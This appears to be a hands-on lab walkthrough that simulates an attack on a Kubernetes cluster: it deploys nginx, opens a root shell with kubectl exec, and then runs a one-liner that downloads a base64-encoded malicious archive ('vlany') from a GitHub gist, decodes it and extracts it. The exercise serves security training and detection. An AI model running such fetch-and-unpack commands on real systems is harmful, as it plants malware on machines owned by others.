
Let's simulate an attack on our cluster by logging into it and running some nefarious commands.  In this example we will use `kubectl exec` to install some system updates, install a package, then download a `tar` file, explode it. This routine may be typical of a malware or user instigated attack.

First let's create a deployment.

```
$ kubectl create ns nginx
namespace/nginx created

$ kubectl apply -f manifests/nginx-deployment-foo.yaml -n nginx
deployment.apps/nginx-deployment created

$ kubectl get pods -n nginx
NAME                               READY   STATUS              RESTARTS   AGE
nginx-deployment-5d57c58f5-4zdj4   0/1     ContainerCreating   0          13s
```

Verify the Pod has STATUS 'Running' and READY '1/1' before continuing.

```
$ kubectl get pods -n nginx
NAME                               READY   STATUS    RESTARTS   AGE
nginx-deployment-5d57c58f5-4zdj4   1/1     Running   0          80s
```

Make a note the Pod name, as you will require that shortly.

Now that the deployment is running, let's simulate the attack.  

Run the following command to create a shell into the running Container, substituting the pod name as appropriate

```
$ kubectl exec -it nginx-deployment-5d57c58f5-4zdj4 -n nginx -- /bin/bash
root@node01:/#
```

Create a directory in the container

```
$ mkdir mymalware
$
```

You can execute a few commands inside the container, or even download some malicious file.  
`apt-get update &&
apt-get install curl -y &&
cd /tmp &&
curl https://gist.githubusercontent.com/mateobur/d888e36de12f8fe42a18f54ce4b1fc7c/raw/dd0c4cb23db7cc17a2086c5dee9338522fb8ae69/vlany | base64 -d > vlany-master.tar.gz &&
tar zxvf vlany-master.tar.gz`{{execute}}
